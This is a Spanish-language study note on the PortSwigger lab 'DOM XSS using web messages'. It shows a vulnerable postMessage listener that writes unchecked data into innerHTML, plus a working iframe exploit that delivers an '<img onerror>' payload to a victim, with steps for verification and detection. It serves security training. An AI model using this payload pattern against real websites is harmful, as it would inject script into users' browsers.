---
aliases:
  - DOM-based 001 - web message a innerHTML
  - dom xss web messages innerHTML
tags:
  - vuln/dom-based
  - example
  - portswigger
---

# 001 — Web message → `innerHTML` (el caso base de DOM-based)

> Lab: [DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages) · **Practitioner** · técnica → [[vulnerabilities/025-dom-based/dom-based|entry point]]

## ¿Por qué acá? (el caso base)
- **Es el punto de partida de los web messages:** la página escucha `addEventListener('message', …)` y mete `e.data` directo en `innerHTML` **sin chequear `event.origin`**. No hay filtro → es el más limpio de los 3 labs de web message.
- **Por qué funciona:** cualquier origen puede mandarle un `postMessage`. Como el listener no valida de dónde viene, un `<iframe>` tuyo en el exploit server dispara el mensaje y el HTML cae en el sink.
- **Detalle clave:** `innerHTML` **no ejecuta `<script>`** → el payload es `<img>` con `onerror`.

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (tu target / exploit server).

Código vulnerable típico en el target:
<pre class="payload"><code>window.addEventListener('message', function(e){
    document.getElementById('ads').innerHTML = e.data;   // sink, sin chequear e.origin
});</code></pre>

En el **exploit server**, guardá un `<iframe>` que dispara el `postMessage` en `onload`:
<pre class="payload"><code>&lt;iframe src="https://<mark>TARGET</mark>.web-security-academy.net/"
  onload="this.contentWindow.postMessage('&lt;img src=1 onerror=<mark>print()</mark>&gt;','*')"&gt;
&lt;/iframe&gt;</code></pre>

**Store** → **Deliver exploit to victim**.

## Verificación
El `print()` se dispara en el navegador de la víctima al cargar tu página → lab resuelto. Confirmás la visita por el **Access log** (IP distinta a la tuya).

## Detalles que se pasan por alto
- `targetOrigin='*'` funciona porque el listener **no valida `e.origin`**; si lo validara habría que ver si el match es débil.
- Se usa `<img src=1 onerror=…>` (no `<script>`) **porque `innerHTML` no corre scripts**.
- **DOM Invader** (browser de Burp) tiene módulo **postMessage** que detecta este source→sink automáticamente.

→ Siguiente: [[vulnerabilities/025-dom-based/examples/002-open-redirection-dom|002 · el sink no es innerHTML sino location.href → open redirect]]
